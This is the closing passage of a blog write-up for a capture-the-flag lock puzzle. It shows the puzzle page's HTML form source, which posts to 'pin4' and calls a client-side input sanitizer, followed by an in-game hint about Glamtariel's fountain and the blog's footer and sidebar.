+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;body&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;form</span> method=<span style=color:#2aa198>&#39;post&#39;</span> action=<span style=color:#2aa198>&#39;pin4&#39;</span><span style=color:#268bd2>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&lt;input</span> class=<span style=color:#2aa198>&#39;inputTxt&#39;</span> name=<span style=color:#2aa198>&#39;inputTxt&#39;</span> type=<span style=color:#2aa198>&#39;text&#39;</span> value=<span style=color:#2aa198>&#39;&#39;</span> autocomplete=<span style=color:#2aa198>&#39;off&#39;</span> onblur=<span style=color:#2aa198>&#39;sanitizeInput()&#39;</span> <span style=color:#268bd2>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&lt;button&gt;</span>GO<span style=color:#268bd2>&lt;/button&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;/form&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;div</span> class=<span style=color:#2aa198>&#39;output&#39;</span><span style=color:#268bd2>&gt;&lt;/div&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;img</span> class=<span style=color:#2aa198>&#39;captured&#39;</span><span style=color:#268bd2>/&gt;</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#586e75>&lt;!-- js --&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;script</span> src=<span style=color:#2aa198>&#39;pin.js&#39;</span><span style=color:#268bd2>&gt;&lt;/script&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/body&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/html&gt;</span>
+</span></span></code></pre></div><p>I will come back later, I guess.</p><p>Hint after completion:</p><pre tabindex=0><code>Great! Thanks so much for your help!
+
+When you get to the fountain inside, there are some things you should consider.
+
+First, it might be helpful to focus on Glamtariel&#39;s CAPITALIZED words.
+
+If you finish those locks, I might just have another hint for you!
+</code></pre></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
+<time>Jan 19, 2023</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2022-10-16-yaml-wrangling-with-rust/ title="YAML Wrangling with Rust">YAML Wrangling with Rust</a></p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, an application security engineer.</p><p>I write about application security, cryptography, static analysis, and
+(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a></li><li><a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a></li><li><a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2023 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>
